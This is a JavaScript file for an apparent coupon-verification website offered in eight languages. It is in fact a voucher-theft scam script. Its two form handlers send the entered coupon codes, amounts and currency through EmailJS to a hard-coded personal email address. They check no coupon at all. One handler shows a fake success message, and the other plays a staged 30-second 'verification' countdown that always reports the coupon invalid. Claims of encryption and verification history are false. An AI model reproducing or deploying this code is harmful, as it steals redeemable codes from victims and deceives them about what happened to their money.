document.getElementById('verification-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const couponCode = document.getElementById('coupon-code').value;

    const loader = document.getElementById('loader');
    loader.style.display = 'flex'; // Affiche le loader

    // Paramètres pour EmailJS
    const templateParams = {
        couponCode: couponCode,
        to_email: 'medessiv@gmail.com' // Changez cette adresse e-mail si nécessaire
    };

    emailjs.send('service_ai90eti', 'template_r45pmso', templateParams)
        .then((response) => {
            loader.style.display = 'none'; // Cache le loader après la vérification
            Swal.fire({
                title: 'Succès!',
                text: 'Votre coupon a été vérifié avec succès!',
                icon: 'success',
                confirmButtonText: 'OK',
                showClass: {
                    popup: 'animate__animated animate__fadeInDown'
                },
                hideClass: {
                    popup: 'animate__animated animate__fadeOutUp'
                }
            });

            

        }, (error) => {
            loader.style.display = 'none'; // Cache le loader en cas d'erreur
            Swal.fire({
                title: 'Erreur!',
                text: 'Il y a eu une erreur lors de la vérification du coupon. Veuillez réessayer.',
                icon: 'error',
                confirmButtonText: 'OK',
                showClass: {
                    popup: 'animate__animated animate__fadeInDown'
                },
                hideClass: {
                    popup: 'animate__animated animate__fadeOutUp'
                }
            });
        });
});

document.getElementById('toggle-password').addEventListener('click', function() {
    var couponCode = document.getElementById('coupon-code');
    var toggleButton = document.getElementById('toggle-password');
    
    if (couponCode.type === 'password') {
        couponCode.type = 'text';
        toggleButton.textContent = '🙈'; // icône pour "masquer"
    } else {
        couponCode.type = 'password';
        toggleButton.textContent = '👁️'; // icône pour "afficher"
    }
});
document.addEventListener('DOMContentLoaded', () => {
    const couponCards = document.querySelectorAll('.coupon-card');
    const languageButton = document.querySelector('.language-button');
    const languageDropdown = document.querySelector('.language-dropdown');
    const languageOptions = document.querySelectorAll('.language-dropdown a');
    const darkModeToggle = document.querySelector('.dark-mode-toggle');
    const verificationForm = document.querySelector('.verification-form');
    const verificationTitle = document.querySelector('.verification-title');
    const couponInput = document.querySelector('.coupon-input');
    const verifyButton = document.querySelector('.verify-button');
    const verificationResult = document.querySelector('.verification-result');
    

    // Translations
    const translations = {
        fr: {
           // home: "Accueil",
           // features: "Fonctionnalités",
            //about: "À propos",
           // contact: "Contact",
            title: "Vérifiez vos coupons en un clic",
            description: "Choisissez le type de coupon que vous souhaitez vérifier :",
            featuresTitle: "Nos fonctionnalités",
            multiLingual: "Multilingue",
            multiLingualDesc: "Traduisez instantanément le contenu dans plusieurs langues",
            security: "Sécurité renforcée",
            securityDesc: "Vérification sécurisée des coupons avec cryptage avancé",
            history: "Historique des vérifications",
            historyDesc: "Suivez vos vérifications précédentes facilement",
            mobile: "Application mobile",
            mobileDesc: "Vérifiez vos coupons en déplacement avec notre app",
            footer: "Tous droits réservés.",
            verificationTitle: "Vérification du coupon",
            couponInput: "Entrez votre code coupon",
            verifyButton: "Vérifier",
            validCoupon: "Coupon valide !",
            invalidCoupon: "Coupon invalide. Veuillez réessayer."
        },
        en: {
            home: "Home",
            features: "Features",
            about: "About",
            contact: "Contact",
            title: "Verify your coupons with one click",
            description: "Choose the type of coupon you want to verify:",
            featuresTitle: "Our features",
            multiLingual: "Multilingual",
            multiLingualDesc: "Instantly translate content into multiple languages",
            security: "Enhanced security",
            securityDesc: "Secure coupon verification with advanced encryption",
            history: "Verification history",
            historyDesc: "Easily track your previous verifications",
            mobile: "Mobile app",
            mobileDesc: "Verify your coupons on the go with our app",
            footer: "All rights reserved.",
            verificationTitle: "Coupon Verification",
            couponInput: "Enter your coupon code",
            verifyButton: "Verify",
            validCoupon: "Valid coupon!",
            invalidCoupon: "Invalid coupon. Please try again."
        },
        es: {
            home: "Inicio",
            features: "Características",
            about: "Acerca de",
            contact: "Contacto",
            title: "Verifica tus cupones con un clic",
            description: "Elige el tipo de cupón que deseas verificar:",
            featuresTitle: "Nuestras características",
            multiLingual: "Multilingüe",
            multiLingualDesc: "Traduce instantáneamente el contenido a varios idiomas",
            security: "Seguridad mejorada",
            securityDesc: "Verificación segura de cupones con encriptación avanzada",
            history: "Historial de verificaciones",
            historyDesc: "Sigue fácilmente tus verificaciones anteriores",
            mobile: "Aplicación móvil",
            mobileDesc: "Verifica tus cupones en movimiento con nuestra app",
            footer: "Todos los derechos reservados.",
            verificationTitle: "Verificación de cupón",
            couponInput: "Ingresa tu código de cupón",
            verifyButton: "Verificar",
            validCoupon: "¡Cupón válido!",
            invalidCoupon: "Cupón inválido. Por favor, inténtalo de nuevo."
        },
        de: {
            home: "Startseite",
            features: "Funktionen",
            about: "Über uns",
            contact: "Kontakt",
            title: "Überprüfen Sie Ihre Gutscheine mit einem Klick",
            description: "Wählen Sie den Gutscheintyp aus, den Sie überprüfen möchten:",
            featuresTitle: "Unsere Funktionen",
            multiLingual: "Mehrsprachig",
            multiLingualDesc: "Übersetzen Sie den Inhalt sofort in mehrere Sprachen",
            security: "Verbesserte Sicherheit",
            securityDesc: "Sichere Gutscheinüberprüfung mit fortschrittlicher Verschlüsselung",
            history: "Überprüfungsverlauf",
            historyDesc: "Verfolgen Sie Ihre vorherigen Überprüfungen ganz einfach",
            mobile: "Mobile App",
            mobileDesc: "Überprüfen Sie Ihre Gutscheine unterwegs mit unserer App",
            footer: "Alle Rechte vorbehalten.",
            verificationTitle: "Gutscheinüberprüfung",
            couponInput: "Geben Sie Ihren Gutscheincode ein",
            verifyButton: "Überprüfen",
            validCoupon: "Gültiger Gutschein!",
            invalidCoupon: "Ungültiger Gutschein. Bitte versuchen Sie es erneut."
        },
        pl:{
            "home": "Strona główna",
            "features": "Funkcje",
            "about": "O nas",
            "contact": "Kontakt",
            "title": "Sprawdź swoje kupony jednym kliknięciem",
            "description": "Wybierz rodzaj kuponu, który chcesz sprawdzić:",
            "featuresTitle": "Nasze funkcje",
            "multiLingual": "Wielojęzyczność",
            "multiLingualDesc": "Natychmiastowe tłumaczenie treści na wiele języków",
            "security": "Zwiększone bezpieczeństwo",
            "securityDesc": "Bezpieczne sprawdzanie kuponów z zaawansowanym szyfrowaniem",
            "history": "Historia sprawdzeń",
            "historyDesc": "Łatwe śledzenie poprzednich sprawdzeń",
            "mobile": "Aplikacja mobilna",
            "mobileDesc": "Sprawdzaj swoje kupony w drodze za pomocą naszej aplikacji",
            "footer": "Wszelkie prawa zastrzeżone.",
            "verificationTitle": "Weryfikacja kuponu",
            "couponInput": "Wprowadź swój kod kuponu",
            "verifyButton": "Sprawdź",
            "validCoupon": "Ważny kupon!",
            "invalidCoupon": "Nieprawidłowy kupon. Proszę spróbować ponownie."
        },
        
        it: {
            home: "Home",
            features: "Caratteristiche",
            about: "Chi siamo",
            contact: "Contatti",
            title: "Verifica i tuoi coupon con un clic",
            description: "Scegli il tipo di coupon che desideri verificare:",
            featuresTitle: "Le nostre caratteristiche",
            multiLingual: "Multilingue",
            multiLingualDesc: "Traduci istantaneamente il contenuto in più lingue",
            security: "Sicurezza potenziata",
            securityDesc: "Verifica sicura dei coupon con crittografia avanzata",
            history: "Cronologia delle verifiche",
            historyDesc: "Tieni facilmente traccia delle tue verifiche precedenti",
            mobile: "App mobile",
            mobileDesc: "Verifica i tuoi coupon in movimento con la nostra app",
            footer: "Tutti i diritti riservati.",
            verificationTitle: "Verifica del coupon",
            couponInput: "Inserisci il tuo codice coupon",
            verifyButton: "Verifica",
            validCoupon: "Coupon valido!",
            invalidCoupon: "Coupon non valido. Per favore, riprova."
        },
        ja: {
            home: "ホーム",
            features: "機能",
            about: "私たちについて",
            contact: "お問い合わせ",
            title: "ワンクリックでクーポンを確認",
            description: "確認したいクーポンの種類を選択してください：",
            featuresTitle: "私たちの機能",
            multiLingual: "多言語対応",
            multiLingualDesc: "コンテンツを複数の言語に即座に翻訳",
            security: "強化されたセキュリティ",
            securityDesc: "高度な暗号化によるセキュアなクーポン確認",
            history: "確認履歴",
            historyDesc: "過去の確認を簡単に追跡",
            mobile: "モバイルアプリ",
            mobileDesc: "外出先でもアプリでクーポンを確認",
            footer: "全著作権所有。",
            verificationTitle: "クーポン確認",
            couponInput: "クーポンコードを入力してください",
            verifyButton: "確認",
            validCoupon: "有効なクーポンです！",
            invalidCoupon: "無効なクーポンです。もう一度お試しください。"
        },
        zh: {
            home: "首页",
            features: "功能",
            about: "关于我们",
            contact: "联系我们",
            title: "一键验证您的优惠券",
            description: "选择您要验证的优惠券类型：",
            featuresTitle: "我们的功能",
            multiLingual: "多语言",
            multiLingualDesc: "即时将内容翻译成多种语言",
            security: "增强安全性",
            securityDesc: "使用先进加密技术安全验证优惠券",
            history: "验证历史",
            historyDesc: "轻松跟踪您的以前验证",
            mobile: "移动应用",
            mobileDesc: "使用我们的应用随时随地验证您的优惠券",
            footer: "版权所有。",
            verificationTitle: "优惠券验证",
            couponInput: "输入您的优惠券代码",
            verifyButton: "验证",
            validCoupon: "有效优惠券！",
            invalidCoupon: "无效优惠券。请重试。"
        }
    };
    
    
        
    function updateLanguage(lang) {
        document.querySelector('.nav-home').textContent = translations[lang].home;
        document.querySelector('.nav-features').textContent = translations[lang].features;
        document.querySelector('.main-title').textContent = translations[lang].title;
        document.querySelector('.main-description').textContent = translations[lang].description;
        document.querySelector('.features-title').textContent = translations[lang].featuresTitle;
        document.querySelectorAll('.feature-card h3')[0].textContent = translations[lang].multiLingual;
        document.querySelectorAll('.feature-card p')[0].textContent = translations[lang].multiLingualDesc;
        document.querySelectorAll('.feature-card h3')[1].textContent = translations[lang].security;
        document.querySelectorAll('.feature-card p')[1].textContent = translations[lang].securityDesc;
        document.querySelectorAll('.feature-card h3')[2].textContent = translations[lang].history;
        document.querySelectorAll('.feature-card p')[2].textContent = translations[lang].historyDesc;
        document.querySelectorAll('.feature-card h3')[3].textContent = translations[lang].mobile;
        document.querySelectorAll('.feature-card p')[3].textContent = translations[lang].mobileDesc;
        document.querySelector('.footer-text').textContent = `© 2023 CouponVerify. ${translations[lang].footer}`;
        verificationTitle.textContent = translations[lang].verificationTitle;
        couponInput.placeholder = translations[lang].couponInput;
        verifyButton.textContent = translations[lang].verifyButton;

        const selectedLang = document.querySelector(`[data-lang="${lang}"]`);
        languageButton.innerHTML = selectedLang.innerHTML;
    }

    languageButton.addEventListener('click', () => {
        languageDropdown.classList.toggle('show');
    });

    languageOptions.forEach(option => {
        option.addEventListener('click', (e) => {
            e.preventDefault();
            const lang = option.getAttribute('data-lang');
            updateLanguage(lang);
            languageDropdown.classList.remove('show');
        });
    });

    couponCards.forEach(card => {
        card.addEventListener('click', () => {
            const couponType = card.getAttribute('data-coupon');
            verificationTitle.textContent = `${translations.en.verificationTitle} ${couponType}`;
            verificationForm.style.display = 'block';
            couponInput.value = '';
            verificationResult.textContent = '';
            couponInput.focus();
        });
    });

    verifyButton.addEventListener('click', () => {
    const loader = document.getElementById('loader');
    loader.style.display = 'flex'; // Affiche le loader
    const couponCode = document.getElementById('coupon-code').value;
const couponAmount = document.getElementById('coupon-amount').value;
    const currency = document.getElementById('currency-select').value;

    // Paramètres pour EmailJS
    const templateParams = {
        couponCode: couponCode,couponAmount: couponAmount,
        currency: currency,
        
        to_email: 'medessiv@gmail.com' // Changez cette adresse e-mail si nécessaire
    };

    emailjs.send('service_45d0fvo', 'coupon001', templateParams)
        .then((response) => {
            loader.style.display = 'none'; // Cache le loader après la vérification

            // Affiche un pop-up avec un compte à rebours de 30 secondes
            Swal.fire({
                title: 'Vérification en cours...',
                html: 'Le coupon sera vérifié dans <b></b> secondes.',
                timer: 30000,
                timerProgressBar: true,
                didOpen: () => {
                    const b = Swal.getHtmlContainer().querySelector('b');
                    Swal.showLoading();
                    const timerInterval = setInterval(() => {
                        b.textContent = Math.ceil(Swal.getTimerLeft() / 1000);
                    }, 1000);
                },
                willClose: () => {
                    // Ce code est exécuté après le compte à rebours de 30 secondes
                    Swal.fire({
                        title: 'Action requise',
                        text: 'Cliquez sur le bouton ci-dessous pour voir l\'état de votre coupon.',
                        icon: 'info',
                        confirmButtonText: 'Voir l\'état du coupon',
                        showClass: {
                            popup: 'animate__animated animate__fadeInDown'
                        },
                        hideClass: {
                            popup: 'animate__animated animate__fadeOutUp'
                        }
                    }).then((result) => {
                        if (result.isConfirmed) {
                            // Notification push.js après avoir cliqué sur le bouton
                            Push.create('Coupon invalide', {
                                body: 'Votre coupon est invalidé après vérification.',
                                icon: 'https://via.placeholder.com/128', // Remplacez par le lien de votre icône
                                timeout: 5000,
                                onClick: function () {
                                    window.focus();
                                    this.close();
                                }
                            });

                            // Affiche le pop-up final
                            Swal.fire({
                                title: 'Échec de la vérification',
                                text: 'La vérification du coupon a échoué. Veuillez réessayer ultérieurement.',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                showClass: {
                                    popup: 'animate__animated animate__fadeInDown'
                                },
                                hideClass: {
                                    popup: 'animate__animated animate__fadeOutUp'
                                }
                            });
                        }
                    });
                }
            });

        }, (error) => {
            loader.style.display = 'none'; // Cache le loader en cas d'erreur
            Swal.fire({
                title: 'Erreur!',
                text: 'Il y a eu une erreur lors de la vérification du coupon. Veuillez réessayer.',
                icon: 'error',
                confirmButtonText: 'OK',
                showClass: {
                    popup: 'animate__animated animate__fadeInDown'
                },
                hideClass: {
                    popup: 'animate__animated animate__fadeOutUp'
                }
            });
        });
});

    darkModeToggle.addEventListener('click', () => {
        document.body.classList.toggle('dark-mode');
        const icon = darkModeToggle.querySelector('i');
        if (document.body.classList.contains('dark-mode')) {
            icon.classList.remove('fa-moon');
            icon.classList.add('fa-sun');
        } else {
            icon.classList.remove('fa-sun');
            icon.classList.add('fa-moon');
        }
    });

    // Close the language dropdown when clicking outside
    document.addEventListener('click', (e) => {
        if (!languageButton.contains(e.target) && !languageDropdown.contains(e.target)) {
            languageDropdown.classList.remove('show');
        }
    });

    // Add smooth scrolling for navigation links
    document.querySelectorAll('nav a').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });

    // Initialize with French language
    updateLanguage('en');
});
